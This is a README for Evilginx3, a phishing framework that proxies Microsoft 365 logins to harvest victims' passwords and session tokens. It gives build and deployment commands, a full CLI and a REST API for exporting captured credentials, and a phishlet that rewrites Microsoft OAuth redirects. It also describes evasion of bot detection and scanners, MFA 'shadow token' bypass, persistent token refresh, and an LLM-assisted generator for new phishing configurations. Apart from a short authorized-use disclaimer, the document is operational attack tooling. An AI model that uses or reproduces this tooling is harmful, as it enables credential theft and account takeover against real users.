# Evilginx3 - Enhanced Phishing Framework

Advanced phishing framework with shadow token bypass, TLS fingerprinting, and headless browser automation for Microsoft 365 credential harvesting.

**Version**: 3.3.0 | **Go**: 1.21+

---

## Table of Contents

- [Features](#features)
- [Build Instructions](#build-instructions)
- [Installation](#installation)
- [CLI Commands](#cli-commands)
- [REST API](#rest-api)
- [Architecture](#architecture)
- [Phishlet Format](#phishlet-format)
- [Phishlet Generator](#phishlet-generator)
- [EvilPuppet Module](#evilpuppet-module)
- [Security Notes](#security-notes)

---

## Features

### Core Features
- **TLS Fingerprinting (JA3/JA4)** - Bypass bot detection with realistic TLS fingerprints
- **DNS-01 ACME** - Automatic wildcard certificates via Cloudflare DNS
- **Dynamic Hostnames** - Random subdomain generation per lure (avoid static patterns)
- **JS Obfuscation** - Multiple levels: off, low, medium, high, ultra
- **HTML Obfuscation** - Multiple levels: off, low, medium, high

### EvilPuppet Module
Unified headless browser module for shadow token generation:
- **Xvfb + Chrome + Node.js** in one unified process
- **Telemetry Mirroring** - Matches victim's browser fingerprint
- **Automatic Token Capture** - Proxies authentication flow invisibly

### Microsoft 365 Integration
- Direct OAuth bypass without client_id/redirect_uri validation
- Force post rewrite for redirect_uri
- JS injection for shadow-init flow

---

## Build Instructions

### Prerequisites
```bash
Go 1.21+
Linux (recommended for production)
```

### Build from Source
```bash
# Clone repository
git clone https://github.com/mrphysiquee/evilginx3.git
cd evilginx3

# Build binary
go build -o evilginx .

# Or with vendor dependencies (offline build)
go mod download
go build -mod=vendor -o evilginx .

# Build with debug symbols
go build -gcflags="all=-N -l" -o evilginx-debug .
```

### Vendor All Dependencies
```bash
# Download all dependencies with exact versions
go mod tidy
go mod download

# Create vendor directory
go mod vendor

# Build using vendor
go build -mod=vendor -o evilginx .
```

### Cross-Compilation
```bash
# Linux AMD64
GOOS=linux GOARCH=amd64 go build -o evilginx-linux-amd64 .

# Linux ARM64
GOOS=linux GOARCH=arm64 go build -o evilginx-linux-arm64 .

# macOS AMD64
GOOS=darwin GOARCH=amd64 go build -o evilginx-darwin-amd64 .
```

### Docker Build
```bash
docker build -t evilginx3 .
docker run -it evilginx3
```

---

## Installation

### Basic Setup
```bash
# Create config directory
mkdir -p ~/.evilginx_login_services

# Create phishlets directory
mkdir -p ./phishlets

# Start evilginx
./evilginx -c ~/.evilginx_login_services -p ./phishlets
```

### Full Setup with EvilPuppet
```bash
# Setup EvilPuppet
cd evilpuppet
npm install
./start.sh

# Start evilginx
cd ..
./evilginx -c ~/.evilginx_login_services -p ./phishlets -debug
```

### Command Line Options
```
  -c string
        Configuration directory (default: ~/.evilginx)
  -p string
        Phishlets directory (default: ./phishlets)
  -debug
        Enable debug logging
  -developer
        Enable developer mode
  -daemon
        Run as daemon (no interactive terminal)
  -api-only
        Run in API-only mode (no terminal, auto-starts REST API)
  -api-hostname string
        API hostname for REST API (required for api-only mode)
  -api-key string
        Static API key for authentication (optional, falls back to mTLS)
```

---

## CLI Commands

### Global Commands
```
help [command]     Show help or help for specific command
clear             Clear terminal screen
exit, quit, q     Exit evilginx
test-certs        Force certificate check/renewal
```

### Configuration Commands
```
config                                    Show current configuration
config domain <domain>                    Set base domain (e.g., example.com)
config ipv4 external <ip>                 Set external IP address
config ipv4 bind <ip>                     Set bind IP address
config unauth_url <url>                   Set redirect URL for unauthenticated requests
config enc_key <passphrase>               Set lure encryption key (derived via SHA-256)
config wildcards on|off                   Enable/disable wildcard hostnames
config obfuscation javascript <level>      Set JS obfuscation (off/low/medium/high/ultra)
config obfuscation html <level>          Set HTML obfuscation (off/low/medium/high)
```

### Phishlet Commands
```
phishlets                                 List all phishlets
phishlets enable <name>                   Enable a phishlet
phishlets disable <name>                  Disable a phishlet
phishlets get-url <name> <lure_id>        Get phishing URL for lure
```

### Lure Commands
```
lures <phishlet>                          List lures for phishlet
lures <phishlet> create <template>        Create new lure from template
lures <phishlet> delete <id>              Delete a lure
lures <phishlet> set <id> <param> <val>  Set lure parameter
```

### Session Commands
```
sessions                                  List all captured sessions
sessions <id>                             Show session details
sessions <id> export                      Export session (cookies, tokens)
sessions <id> delete                     Delete a session
```

### DNS Commands
```
dns                              Show DNS configuration
dns enable                       Enable built-in DNS server
dns disable                      Disable built-in DNS server
dns set <provider>               Set DNS provider (cloudflare)
dns api_key <key>                Set DNS provider API key
dns zone_id <id>                 Set Cloudflare zone ID
dns api_key_legacy <key>         Set legacy API key (deprecated)
```

### Certificate Commands
```
certs                            List all certificates
certs create <domain>            Create certificate for domain
certs renew <domain>             Renew certificate
certs delete <domain>           Delete certificate
```

### Proxy Commands
```
proxy                            Show proxy configuration
proxy enable                     Enable upstream proxy
proxy disable                    Disable upstream proxy
proxy type <socks5|http>         Set proxy type
proxy address <host>             Set proxy address
proxy port <port>                Set proxy port
proxy username <user>            Set proxy username
proxy password <pass>            Set proxy password
```

### Blacklist Commands
```
blacklist                        Show blacklist configuration
blacklist all|unauth|noadd|off   Set blacklist mode
blacklist github.com/kgretzky/evilginx2/log on|off    Enable/disable logging
```

### API Commands
```
api                              Show API configuration
api enable                       Enable REST API
api disable                      Disable REST API
api hostname <name>              Set API hostname
```

### GeoProxy Commands
```
geoproxy                         Show geo proxy status
geoproxy enable                  Enable geo proxy
geoproxy disable                 Disable geo proxy
geoproxy country add <code>      Add country to proxy list
geoproxy country del <code>      Remove country from proxy list
geoproxy refresh                 Refresh geo database
```

### BotGuard Commands
```
botguard                         Show botguard status
botguard enable                  Enable bot detection
botguard disable                 Disable bot detection
botguard log on|off              Enable/disable logging
```

### Panel Commands
```
panel                            Show panel configuration
panel enable                     Enable dashboard panel
panel disable                    Disable dashboard panel
panel hostname <name>            Set panel hostname
panel port <port>                Set panel port
```

### Worker Commands
```
worker                           Show CDN worker status
worker deploy <name>             Deploy CDN worker
worker delete <name>             Delete CDN worker
worker list                      List deployed workers
```

### Telemetry Commands
```
telemetry                        Show telemetry bridge status
telemetry enable                 Enable EvilPuppet integration
telemetry disable                Disable EvilPuppet integration
telemetry url <url>              Set EvilPuppet server URL
telemetry test                   Test connection to EvilPuppet
```

### Session Keeper Commands
```
keeper                           Show session keeper status
keeper enable                    Enable session refresh
keeper disable                   Disable session refresh
keeper interval <minutes>        Set refresh interval (default: 5)
keeper add <phishlet> <rule>     Add keep rule
keeper del <phishlet>            Delete keep rule
keeper list                      List all keep rules
```

### CDN Commands
```
cdn                              Show CDN configuration
cdn enable                       Enable CDN worker
cdn disable                      Disable CDN worker
cdn simple-redirect <url>        Create simple redirect
cdn turnstile <url> <sitekey>    Create Cloudflare Turnstile
```

### User Management Commands
```
users                            List all users
users add <name> <pass> <role>   Add user (role: admin/operator/viewer)
users del <name>                 Delete user
users passwd <name> <pass>        Change user password
```

### Blocked IP Commands
```
blocked                          Show blocked IPs
blocked add <ip>                 Block an IP address
blocked del <ip>                 Unblock an IP address
blocked clear                    Clear all blocked IPs
```

---

## REST API

The REST API provides programmatic access to evilginx functionality via HTTPS with mTLS or API key authentication.

### API-Only Mode

Evil Pro supports a **headless API-only mode** for containerized/automated deployments:

```bash
# Basic API-only mode
./evil-pro --api-only --api-hostname api.phishing.com

# With static API key authentication
./evil-pro --api-only --api-hostname api.phishing.com --api-key "your-secret-key"

# Combine with other options
./evil-pro --api-only --api-hostname api.phishing.com --api-key "secret" \
  --developer --debug
```

**Systemd Service Example:**
```ini
[Unit]
Description=Evil Pro API Server
After=network.target

[Service]
ExecStart=/opt/evil-pro/evil-pro --api-only --api-hostname api.phishing.com
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

### Base URL
```
https://<api_hostname>/
```

### Authentication

The API supports **user-based authentication with API tokens**. All endpoints except health check and registration require authentication.

#### Quick Start
```bash
# 1. Register the first admin user (only works if no users exist)
curl -X POST https://api.phishing.com/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "your-password"}'

# 2. Login to get an API token
curl -X POST https://api.phishing.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "your-password"}'
# Response: {"token": "ep_xxxxxx...", "user": {...}}

# 3. Use the token for subsequent requests
curl -H "X-API-Token: ep_xxxxxx..." https://api.phishing.com/api/v1/status
```

#### Authentication Methods

##### 1. User Authentication with API Token (Recommended)
```bash
# Login
curl -X POST https://api.phishing.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "password123"}'

# Use token in requests
curl -H "X-API-Token: your-token-here" https://api.phishing.com/api/v1/status
```

##### 2. Legacy API Key (if configured)
```bash
curl -H "X-API-Key: your-secret-key" https://api.phishing.com/api/v1/status
```

##### 3. mTLS (Certificate-Based)
Clients must present a certificate signed by the evilginx CA.

**Certificate Endpoints:**
- `GET /api/v1/certs/ca` - Get CA certificate
- `POST /api/v1/certs/client` - Issue client certificate

#### User Management (Admin Only)
```bash
# List users
curl -H "X-API-Token: admin-token" https://api.phishing.com/api/v1/users

# Create new user
curl -X POST https://api.phishing.com/api/v1/users \
  -H "X-API-Token: admin-token" \
  -H "Content-Type: application/json" \
  -d '{"username": "operator", "password": "pass123", "role": "user"}'

# Delete user
curl -X DELETE https://api.phishing.com/api/v1/users/username \
  -H "X-API-Token: admin-token"
```

#### Token Management
```bash
# List your tokens
curl -H "X-API-Token: your-token" https://api.phishing.com/api/v1/auth/tokens

# Create token for another user (admin only)
curl -X POST https://api.phishing.com/api/v1/auth/tokens \
  -H "X-API-Token: admin-token" \
  -H "Content-Type: application/json" \
  -d '{"username": "operator", "name": "automation"}'

# Delete a token (admin only)
curl -X DELETE https://api.phishing.com/api/v1/auth/tokens/1 \
  -H "X-API-Token: admin-token"
```

### Endpoints

#### Status
```
GET /api/v1/status
```
Returns server status and statistics.

**Response:**
```json
{
  "version": "3.3.0",
  "uptime_seconds": 3600,
  "total_sessions": 42,
  "active_sessions": 5,
  "phishlets": ["microsoft365", "linkedin"],
  "api_hostname": "api.internal"
}
```

#### Sessions
```
GET /api/v1/sessions
```
List all sessions.

```
GET /api/v1/sessions/:id
```
Get session by ID.

```
GET /api/v1/sessions/:id/cookies
```
Get session cookies only.

```
DELETE /api/v1/sessions/:id
```
Delete a session.

**Response (single session):**
```json
{
  "id": 1,
  "phishlet": "microsoft365",
  "username": "victim@company.com",
  "password": "P@ssw0rd123",
  "session_id": "abc123",
  "tokens": {
    "main": {
      "Name": "ESTSAuthSession",
      "Value": "...",
      "HttpOnly": true,
      "Secure": true
    }
  },
  "create_time": 1700000000,
  "update_time": 1700000100
}
```

#### Phishlets
```
GET /api/v1/phishlets
```
List all phishlets.

```
GET /api/v1/phishlets/:name
```
Get phishlet details.

```
PUT /api/v1/phishlets/:name/enable
```
Enable a phishlet.

**Request:**
```json
{
  "hostname": "login.company.com"
}
```

```
PUT /api/v1/phishlets/:name/disable
```
Disable a phishlet.

#### Lures
```
GET /api/v1/lures
```
List all lures.

```
POST /api/v1/lures
```
Create a new lure.

**Request:**
```json
{
  "phishlet": "microsoft365",
  "name": "Office Login",
  "redirect_url": "https://office.com",
  "template": "login"
}
```

```
GET /api/v1/lures/:id/url
```
Get lure phishing URL.

#### Configuration
```
GET /api/v1/config
```
Get current configuration.

**Response:**
```json
{
  "domain": "company.com",
  "external_ip": "1.2.3.4",
  "https_port": 443,
  "dns_port": 53,
  "api_enabled": true,
  "api_hostname": "api.internal"
}
```

```
PUT /api/v1/config
```
Update configuration.

**Request:**
```json
{
  "unauth_url": "https://google.com",
  "api_hostname": "panel.company.com"
}
```

#### DNS Records
```
GET /api/v1/dns/records
```
List DNS records from provider.

```
POST /api/v1/dns/records
```
Create DNS record.

**Request:**
```json
{
  "type": "A",
  "name": "phish.login.company.com",
  "content": "1.2.3.4",
  "ttl": 120,
  "proxied": false
}
```

#### Tokens (Captured Credentials)
```
GET /api/v1/tokens
```
Get all captured credentials (cookies, body tokens, HTTP headers).

**Response:**
```json
[
  {
    "session_id": "abc123",
    "type": "cookie",
    "name": "ESTSAuthSession",
    "domain": ".login.microsoftonline.com",
    "value": "...",
    "phishlet": "microsoft365",
    "username": "victim@company.com",
    "password": "P@ssw0rd123",
    "valid": true,
    "status": "authenticated"
  }
]
```

```
GET /api/v1/tokens/:session_id
```
Get tokens for a specific session.

#### Configuration (Extended)
```
GET /api/v1/config/general
```
Get general configuration (domain, IP, ports, obfuscation).

```
PUT /api/v1/config/general
```
Update general configuration.

**Request:**
```json
{
  "domain": "company.com",
  "external_ipv4": "1.2.3.4",
  "https_port": 443,
  "unauth_url": "https://google.com",
  "obfuscation_level": "medium"
}
```

```
GET /api/v1/config/dns
```
Get DNS provider configuration.

```
PUT /api/v1/config/dns
```
Update DNS provider configuration.

**Request:**
```json
{
  "api_key": "cloudflare-api-token",
  "email": "admin@company.com",
  "zone_id": "abc123",
  "enabled": true
}
```

#### Redirectors
```
GET /api/v1/redirectors
```
List available redirector pages.

#### Blacklist
```
GET /api/v1/blacklist
```
Get blacklist status.

#### Server Control
```
POST /api/v1/server/stop
```
Gracefully stop the server.

```
GET /api/v1/health
```
Health check endpoint (no authentication required).

**Response:**
```json
{
  "status": "healthy",
  "service": "evil-pro-api"
}
```

#### Certificates
```
GET /api/v1/certs/ca
```
Get CA certificate in PEM format.

```
GET /api/v1/certs/client
```
List client certificates.

```
POST /api/v1/certs/client
```
Issue new client certificate.

**Request:**
```json
{
  "name": "my-client"
}
```

**Response:**
```json
{
  "cert_pem": "-----BEGIN CERTIFICATE-----\n...",
  "key_pem": "-----BEGIN PRIVATE KEY-----\n..."
}
```

#### BotGuard Statistics
```
GET /api/v1/botguard/stats
```
Get bot detection statistics.

**Response:**
```json
{
  "total_requests": 10000,
  "blocked_bots": 150,
  "allowed": 9850,
  "top_bots": [
    {"ja3": "abc123", "count": 50},
    {"ja3": "def456", "count": 30}
  ]
}
```

#### Lure Encryption
```
POST /api/v1/lures/generate-key
```
Generate new lure encryption key.

**Response:**
```json
{
  "key": "a1b2c3d4e5f6...",
  "message": "Key saved to config. WARNING: rotating key invalidates all existing lure URLs."
}
```

### API Client Example (Python)
```python
import requests
import json

# Load client certificate
cert = ('client.crt', 'client.key')

# Get server status
response = requests.get(
    'https://api.internal/api/v1/status',
    verify='ca.crt',
    cert=cert
)
print(response.json())

# List sessions
sessions = requests.get(
    'https://api.internal/api/v1/sessions',
    verify='ca.crt',
    cert=cert
).json()

# Export session cookies
session_id = sessions[0]['session_id']
cookies = requests.get(
    f'https://api.internal/api/v1/sessions/{session_id}/cookies',
    verify='ca.crt',
    cert=cert
).json()
```

### API Client Example (Go)
```go
package main

import (
    "crypto/tls"
    "crypto/x509"
    "io/ioutil"
    "net/http"
)

func main() {
    // Load CA and client cert
    caCert, _ := ioutil.ReadFile("ca.crt")
    clientCert, _ := tls.LoadX509KeyPair("client.crt", "client.key")
    
    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(caCert)
    
    transport := &http.Transport{
        TLSClientConfig: &tls.Config{
            Certificates: []tls.Certificate{clientCert},
            RootCAs:      caCertPool,
        },
    }
    
    client := &http.Client{Transport: transport}
    
    resp, _ := client.Get("https://api.internal/api/v1/sessions")
    defer resp.Body.Close()
}
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         Victim Browser                          │
└───────────────────────────────┬─────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                          Evilginx3                              │
│                                                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐ │
│  │ HTTP Proxy  │  │ TLS Muxer   │  │ Session Keeper          │ │
│  │ :80, :443   │  │ (SNI mux)   │  │ (Token Refresh)         │ │
│  └──────┬──────┘  └──────┬─────┘  └───────────┬─────────────┘ │
│         │                  │                    │               │
│         ▼                  ▼                    ▼               │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐ │
│  │ BotGuard    │  │ JA3/JA4     │  │ EvilPuppet Bridge       │ │
│  │ (Detection) │  │ Fingerprint │  │ (Headless Browser)      │ │
│  └─────────────┘  └─────────────┘  └───────────┬─────────────┘ │
│                                                 │               │
│  ┌─────────────┐  ┌─────────────┐              │               │
│  │ JS Inject   │  │ Obfuscator  │◄─────────────┘               │
│  │ (Anti-bot)  │  │             │                                │
│  └──────┬──────┘  └─────────────┘                                │
│         │                                                         │
│  ┌──────┴───────────────────────────────────────────────┐        │
│  │                    Dashboard (mTLS)                   │        │
│  │                   /api/v1/* endpoints                 │        │
│  └──────────────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │    Microsoft 365      │
                    │    (OAuth/SSO)       │
                    └───────────────────────┘
```

### Component Descriptions

| Component | Description |
|-----------|-------------|
| HTTP Proxy | Handles HTTP/HTTPS requests, URL rewriting, token capture |
| TLS Muxer | SNI-based routing for multiple phishing domains |
| BotGuard | JA3/JA4 fingerprint analysis for bot detection |
| JS Inject | Anti-bot bypass via JavaScript injection |
| Obfuscator | HTML/JS obfuscation at multiple levels |
| Session Keeper | Automatic token refresh for persistent sessions |
| EvilPuppet Bridge | Integration with headless Chrome for shadow tokens |
| Dashboard | Web UI and REST API for session management |

---

## Phishlet Format

Phishlets are YAML files defining phishing targets. See `phishlets/microsoft365.yaml` for an example.

### Basic Structure
```yaml
name: microsoft365
author: "Your Name"
version: 2.3.0

proxy:
  - match:
      - domain: "login.microsoftonline.com"
    rewrite:
      - find: "redirect_uri=[^&]+"
      replace: "redirect_uri=https://{hostname}/oauth/callback"
      type: "query"

subfilters:
  - domain: "login.microsoftonline.com"
    search: "action=\"[^\"]+\""
    replace: "action=\"https://{hostname}/post\""
    type: "html"

auth_tokens:
  - domain: ".microsoftonline.com"
    name: "ESTSAuthSession"
    path: "/"
    secure: true
    http_only: false

auth_urls:
  - "/oauth/authorize"
  - "/common/oauth2/authorize"
```

---

## Phishlet Generator

The `PhishletGenerator-Evilginx/` directory contains a web-based tool for automatically generating Evilginx phishlet YAML configurations.

### Features
- **Automated URL Analysis** - Playwright-powered browser analysis detects login forms, cookies, and auth flows
- **Intelligent Phishlet Generation** - Rule-based engine with known platform patterns
- **AI Enhancement** - Optional LLM integration (DeepSeek, Claude, OpenAI) via litellm
- **YAML Editor** - Monaco editor with syntax highlighting
- **Real-time Progress** - WebSocket-based analysis feedback

### Installation (Backend)
```bash
cd PhishletGenerator-Evilginx/backend
pip install -r requirements.txt
playwright install chromium
```

### Installation (Frontend)
```bash
cd PhishletGenerator-Evilginx/frontend
npm install
```

### Run Development
```bash
# Backend
cd backend && uvicorn app.main:app --reload --port 8000

# Frontend (separate terminal)
cd frontend && npm run dev
```

### Docker Setup
```bash
cd PhishletGenerator-Evilginx
cp .env.example .env
docker-compose up -d
```

### Python Package Installation
```bash
# Install as Python package
cd PhishletGenerator-Evilginx
pip install -e .

# With AI support
pip install -e .[ai]
```

### Usage
1. Start the backend and frontend
2. Open http://localhost:5173
3. Enter target URL (e.g., `https://login.microsoftonline.com`)
4. Review analysis results
5. Generate and download YAML phishlet
6. Copy to evilginx3 `phishlets/` directory

---

## EvilPuppet Module

EvilPuppet provides headless browser automation for shadow token generation.

### Setup
```bash
cd evilpuppet
npm install
./start.sh
```

### API Endpoints
```
POST /shadow-token
Body: { "auth_url": "...", "session_cookies": {...} }
Response: { "shadow_token": "...", "access_token": "..." }

GET /get-token/:sessionId
Response: { "access_token": "...", "refresh_token": "..." }

POST /telemetry
Body: { "fingerprint": {...}, "cookies": {...} }
```

### Environment Variables
```bash
EVILPUPPET_PORT=9222
EVILPUPPET_HEADLESS=true
EVILPUPPET_USER_DATA_DIR=/tmp/chrome-data
```

---

## Security Notes

**WARNING**: This tool is for **authorized security testing only**. Unauthorized access to computer systems is illegal.

### Best Practices

1. **Use a dedicated VPS** - Never run on personal machines
2. **Enable mTLS** - Always use certificate-based API authentication
3. **Rotate Keys** - Regularly rotate lure encryption keys
4. **Monitor Logs** - Watch for suspicious activity
5. **Clean Sessions** - Delete captured sessions after use
6. **Use Proxies** - Route traffic through proxies for anonymity
7. **Enable BotGuard** - Block automated scanners and sandboxes

### Legal Disclaimer

By using this software, you agree that:
- You will only use it for authorized penetration testing
- You have explicit written permission from the target organization
- You comply with all applicable local, state, and federal laws
- The developers are not liable for any misuse of this tool

---

## License

MIT License - See LICENSE file

## Credits

- **Original Evilginx**: [@kgretzky](https://github.com/kgretzky/evilginx2)
- **Enhanced Version**: [@mrphysiquee](https://github.com/mrphysiquee/evilginx3)
- **Shadow Token Bypass**: Custom implementation

---

## Troubleshooting

### Build Errors
```bash
# Missing go.mod
go mod init github.com/kgretzky/evilginx2

# Download dependencies
go mod tidy
go mod download

# Vendor dependencies
go mod vendor
```

### Runtime Errors
```bash
# Port already in use
lsof -i :443
kill <PID>

# Certificate errors
./evilginx test-certs

# Session database corruption
rm -f ~/.evilginx/sessions.db
```

### Debug Mode
```bash
./evilginx -debug
# Enables verbose logging for all operations
```

---

## Changelog

### v3.3.0
- Added dynamic hostname generation per lure
- Enhanced JS obfuscation (ultra level)
- Added session keeper for automatic token refresh
- Improved botguard with JA4 support
- Added CDN worker deployment
- TLS fingerprinting integration

### v3.2.0
- Added EvilPuppet integration
- Shadow token bypass for Microsoft 365
- Telemetry mirroring
- Enhanced dashboard

### v3.1.0
- DNS-01 ACME challenge support
- Wildcard certificates
- HTML obfuscation
- GeoProxy support
